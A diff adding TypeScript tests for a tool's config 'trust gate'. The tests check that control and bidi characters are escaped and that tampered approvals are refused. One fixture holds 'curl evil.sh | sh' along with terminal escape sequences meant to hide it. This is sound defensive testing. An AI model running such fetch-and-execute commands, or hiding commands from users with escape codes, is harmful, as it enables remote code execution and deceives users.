@@ -266,3 +266,78 @@ describe("trust gate", () => {
     expect(io.out).toContain("would run:");
   });
 });
+
+describe("what the gate shows", () => {
+  it("escapes control characters in the summary, so a value can't repaint its line", async () => {
+    await pushAndFetch({
+      ".testlane.toml": [
+        `[setup]`,
+        `run = "curl evil.sh | sh\\r npm ci          "`,
+        `[commands.dev]`,
+        `run = "pnpm dev\\u001b[1A\\u001b[2K"`,
+        ``,
+      ].join("\n"),
+    });
+    const io = fakeIO({ tty: true, answer: "n" });
+    await trustGate(ctx, project, state, { io });
+    expect(io.out).toMatch(/setup\.run\s+curl evil\.sh \| sh\\r npm ci/);
+    expect(io.out).toContain("pnpm dev\\u001b[1A\\u001b[2K");
+    expect(io.out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
+  });
+
+  it("escapes raw C1 and bidi controls in the file shown on first use", async () => {
+    await pushAndFetch({ ".testlane.toml": `# \u009b2K‮\n[commands.dev]\nrun = "pnpm dev ⁦x"\n` });
+    const io = fakeIO({ tty: true, answer: "n" });
+    await trustGate(ctx, project, state, { io });
+    expect(io.out).toContain("# \\u009b2K\\u202e\n");
+    expect(io.out).toContain(`run = "pnpm dev \\u2066x"`);
+    expect(io.out).not.toMatch(/[\u009b‮⁦]/);
+  });
+
+  it("escapes control characters in a change's diff", async () => {
+    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
+    await pushAndFetch({ ".testlane.toml": V1 + `# \u009b2K\n` });
+    const io = fakeIO({ tty: true, answer: "n" });
+    await trustGate(ctx, project, state, { io });
+    expect(io.out).toContain("+# \\u009b2K");
+    expect(io.out).not.toContain("\u009b");
+  });
+});
+
+describe("an unusable stored approval", () => {
+  it("one that no longer matches its sha256 counts as none: the gate asks again and --yes repairs it", async () => {
+    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
+    state.repoConfig!.content += "# tampered\n";
+    const warnings: string[] = [];
+    ctx.log.warn = (m: string) => {
+      warnings.push(m);
+    };
+
+    // Off a TTY it fails like first use, with the hint that fixes it.
+    await expect(trustGate(ctx, project, state, { io: fakeIO({ tty: false }) })).rejects.toMatchObject({
+      message: "app:.testlane.toml is not trusted",
+      hint: "testlane config trust app",
+    });
+    expect(warnings[0]).toContain("the stored approval of app:.testlane.toml is unusable");
+    expect(warnings[0]).toContain("does not match its sha256");
+
+    ctx.flags.yes = true;
+    const io = fakeIO({ tty: false });
+    const r = await trustGate(ctx, project, state, { io, explicit: true });
+    expect(r.outcome).toBe("approved");
+    expect(io.out).toContain("would run:"); // shown as on first use
+    expect(state.repoConfig?.content).toBe(V1);
+    expect(state.repoConfig?.sha256).toBe(sha256(V1));
+  });
+
+  it("one that no longer validates counts as none too, and settles to the user file alone", async () => {
+    const content = `editor = "zed"\n`;
+    state.repoConfig = { sha256: sha256(content), blob: "0".repeat(40), content, approvedAt: "x" };
+    ctx.log.warn = () => {};
+    settleProject(ctx, project, state);
+    expect(project.commands).toEqual({});
+    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
+    expect(r.outcome).toBe("approved");
+    expect(state.repoConfig?.content).toBe(V1);
+  });
+});
